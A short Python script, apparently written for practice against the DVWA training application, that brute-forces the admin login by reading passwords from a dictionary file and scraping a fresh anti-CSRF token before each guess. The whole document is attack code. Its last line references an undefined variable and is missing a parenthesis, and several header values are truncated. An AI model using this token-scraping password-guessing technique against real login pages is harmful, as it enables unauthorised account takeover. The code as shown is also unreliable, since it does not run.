import requests
from lxml import etree

header = {'Accept':	
'text/html,application/xhtml+xm…plication/xml;q=0.9,*/*;q=0.8',
'Accept-Encoding':	
'gzip, deflate',
'Accept-Language':	
'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Cookie':
'security=impossible; security=…ID=veqktj7bqtjbssod6jcfh7q0l5',
'Host':
'172.30.24.118',
'Referer':	
'http://172.30.24.118/DVWA-master/vulnerabilities/brute/index.php',
'User-Agent':	
'Mozilla/5.0 (Windows NT 6.1; W…) Gecko/20100101 Firefox/58.0'}
          
requrl = 'http://172.30.24.118/DVWA-master/vulnerabilities/brute/'
ss = requests.session()
def get_token(): # 获取 token
    #ss = requests.session()
    r = ss.get(requrl, headers=header)
    tree = etree.HTML(r.text)
    
    user_token = tree.xpath('//input[@name="user_token"]/@value')[0]

    return user_token
# user_token 每次请求都不一样
fp = open("zidian.txt", 'r')
for line in fp:
    token = get_token()
    url = requrl + "?username=admin&password=" + line.strip() + "&Login=Loign&user_token=" + token

    rsp = ss.get(url, headers=header)
    print(password.strip(), len(rsp.text)
